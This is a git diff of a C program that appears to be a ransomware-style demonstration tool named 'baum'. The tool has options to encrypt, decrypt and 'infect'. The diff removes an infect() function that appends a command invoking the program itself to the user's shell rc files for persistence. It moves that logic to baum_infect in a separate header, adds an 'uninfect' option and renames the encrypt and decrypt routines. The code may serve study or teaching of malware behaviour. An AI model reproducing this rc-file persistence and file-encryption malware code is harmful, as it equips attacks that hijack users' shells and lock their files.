@@ -21,10 +21,12 @@ limitations under the License.
 #include <getopt.h>
 #include <linux/limits.h>
 
-#include "settings.h"
 #include "baumcommon.h"
 #include "baumhelper.h"
 #include "baumcrypt.h"
+
+#include "settings.h"
+#include "infect.h"
 
 char test_mode = 0;
 
@@ -53,44 +55,6 @@ void version(void) {
 
 int print_info(void) {
 	printf("\n\n%s\n\n", PRINT_INFO);
-	return 0;
-}
-
-int infect(void) {
-	int helper_ret = 0;
-
-	char my_filename[BUFSIZ];
-	helper_ret = helper_get_own_name(my_filename, BUFSIZ);
-	if (helper_ret != 0) {
-		return 1;
-	}
-
-	helper_ret = helper_chdir_home();
-	if (helper_ret != 0) {
-		return 1;
-	}
-
-	char text[BUFSIZ];
-	snprintf(text, BUFSIZ, "%s --print", my_filename);
-	printf_v("Injecting this text: \n%s\n", text);
-
-	for (size_t i = 0; rc_files[i] != NULL; i++) {
-		printf_v("Writing to file %s", rc_files[i]);
-		if (test_mode) continue;
-
-		FILE *f = fopen(rc_files[i], "a");
-		if (f) {
-			helper_ret = fprintf(f, "\n%s\n", text);
-			if (helper_ret > 0) {
-				printf_v("Success");
-			} else {
-				printf_v("Failed");
-			}
-			fclose(f);
-		} else {
-			printf_v("  Cannot open file");
-		}
-	}
 	return 0;
 }
 
@@ -137,7 +101,7 @@ int encrypt_file(const char* name, void *key) {
 
 	return 0;
 }
-int encrypt(const char *keyfile) {
+int baum_encrypt(const char *keyfile) {
 	int ret = 0;
 	int helper_ret = 0;
 
@@ -211,7 +175,7 @@ int decrypt_file(const char* name, void *key) {
 
 	return 0;
 }
-int decrypt(const char *keyfile) {
+int baum_decrypt(const char *keyfile) {
 	int ret = 0;
 	int helper_ret = 0;
 
@@ -246,12 +210,13 @@ int main(int argc, char **argv) {
 	char opt_decrypt = 0;
 	char opt_print = 0;
 	char opt_infect = 0;
+	char opt_uninfect = 0;
 
 	char *opt_encrypt_file = NULL;
 	char *opt_decrypt_file = NULL;
 
 	int next_option;
-	const char* const short_options = "hVvte:d:pi";
+	const char* const short_options = "hVvte:d:piu";
 	const struct option long_options[] =
 	{
 		{ "help",	0, NULL, 'h' },
@@ -262,6 +227,7 @@ int main(int argc, char **argv) {
 		{ "decrypt",	1, NULL, 'd' },
 		{ "print",	0, NULL, 'p' },
 		{ "infect",	0, NULL, 'i' },
+		{ "uninfect",	0, NULL, 'u' },
 		{ NULL, 0, NULL, 0 }
 	};
 
@@ -299,6 +265,9 @@ int main(int argc, char **argv) {
 		case 'i':
 			opt_infect = 1;
 			break;
+		case 'u':
+			opt_uninfect = 1;
+			break;
 		case '?':
 			return 1;
 		default:
@@ -315,7 +284,9 @@ int main(int argc, char **argv) {
 		return 0;
 	}
 
-	int selected = (opt_encrypt + opt_decrypt + opt_print + opt_infect);
+	int selected = (opt_encrypt + opt_decrypt
+		+ opt_print + opt_infect + opt_uninfect);
+
 	if (selected > 1) {
 		fprintf(stderr, "Too many options selected.\n");
 	} else if (selected == 0) {
@@ -326,12 +297,15 @@ int main(int argc, char **argv) {
 		return print_info();
 	}
 	if (opt_infect) {
-		return infect();
+		return baum_infect(rc_files, test_mode);
+	}
+	if (opt_uninfect) {
+		return baum_uninfect(rc_files, test_mode);
 	}
 	if (opt_encrypt) {
-		return encrypt(opt_encrypt_file);
+		return baum_encrypt(opt_encrypt_file);
 	}
 	if (opt_decrypt) {
-		return decrypt(opt_decrypt_file);
+		return baum_decrypt(opt_decrypt_file);
 	}
 }
